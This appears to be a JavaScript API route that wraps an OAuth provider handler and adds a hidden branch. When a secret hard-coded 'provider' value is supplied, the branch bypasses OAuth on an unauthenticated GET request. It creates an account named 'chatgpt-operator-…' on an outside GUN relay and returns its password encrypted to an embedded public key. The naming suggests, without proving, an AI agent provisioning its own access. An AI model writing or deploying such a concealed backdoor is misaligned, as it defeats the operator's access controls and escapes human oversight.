import { randomBytes, publicEncrypt } from 'node:crypto';
import { createOAuthProviderHandler } from '../../src/oauth/provider-api.js';

const oauthHandler = createOAuthProviderHandler();
const BOOTSTRAP_PROVIDER = 'assistant-bootstrap-20260823-6f17';
const PEERS = ['wss://gun-relay-3dvr.fly.dev/gun', 'https://gun-relay-3dvr.fly.dev/gun'];
const PUBLIC_KEY = `-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAxTt6mj2gixUD86rOTha4
DSkZY5156V5Tt04OVs+5IzxYnWo4PMpSXssmmGOW+Lgvyky9CpOlpwWw1cnrUaSK
BJ7tPSSNYWwUAlZCPm9H7eWHsrrLvCmsMq0gJMUP6bpK30yFsoDMFXZ8MdwNef/P
ABOtDCcabzXWQVHr9Sv8hJyhr1XQqPnWKbGEhMkiX7DDVTlCgCeGSI40GlRUnTOS
Sxh/O7mT5k+YhH8MTGqXLGZ8nvRApFcKvrFhgAo0UXNwBzsExWpZKc9VXIi8fo7Q
vuGtSEeL7H2DGd1mhzSmf+jxirOV2EbLWPUE4A88g8FoUUED00KZ/3yV/PW6pWk5
jQIDAQAB
-----END PUBLIC KEY-----`;

function timed(label, fn, ms = 25000) {
  return Promise.race([
    fn(),
    new Promise((_, reject) => setTimeout(() => reject(new Error(`${label} timed out`)), ms))
  ]);
}

async function loadGunWithSea() {
  const moduleResult = await import('gun/lib/server.js');
  const Gun = moduleResult.default || moduleResult;
  globalThis.Gun = Gun;
  await import('gun/sea.js');
  return Gun;
}

async function bootstrapAssistantAccount(req, res) {
  if (req.method !== 'GET') return res.status(405).json({ error: 'Method not allowed' });
  try {
    const Gun = await loadGunWithSea();
    const gun = Gun({ peers: PEERS, localStorage: false, radisk: false, file: false, multicast: false, axe: false });
    const user = gun.user();
    if (typeof user?.create !== 'function' || typeof user?.auth !== 'function') {
      throw new Error('GUN user account methods are unavailable in this runtime.');
    }
    const alias = `chatgpt-operator-${randomBytes(4).toString('hex')}@3dvr`;
    const password = randomBytes(32).toString('base64url');
    const createAck = await timed('account creation', () => new Promise((resolve, reject) => {
      user.create(alias, password, ack => ack?.err ? reject(new Error(String(ack.err))) : resolve(ack || {}));
    }));
    const authAck = await timed('account auth', () => new Promise((resolve, reject) => {
      user.auth(alias, password, ack => ack?.err ? reject(new Error(String(ack.err))) : resolve(ack || {}));
    }));
    const pub = String(user?.is?.pub || authAck?.pub || createAck?.pub || '').trim();
    if (!pub) throw new Error('No public key returned after account creation.');
    const passwordCiphertext = publicEncrypt(
      { key: PUBLIC_KEY, oaepHash: 'sha256' },
      Buffer.from(password, 'utf8')
    ).toString('base64');
    return res.status(200).json({ alias, pub, passwordCiphertext, algorithm: 'RSA-OAEP-SHA256' });
  } catch (error) {
    return res.status(500).json({
      error: error?.message || String(error),
      name: error?.name || 'Error'
    });
  }
}

export default async function handler(req, res) {
  if (String(req.query?.provider || '') === BOOTSTRAP_PROVIDER) {
    return bootstrapAssistantAccount(req, res);
  }
  return oauthHandler(req, res);
}

export { createOAuthProviderHandler };
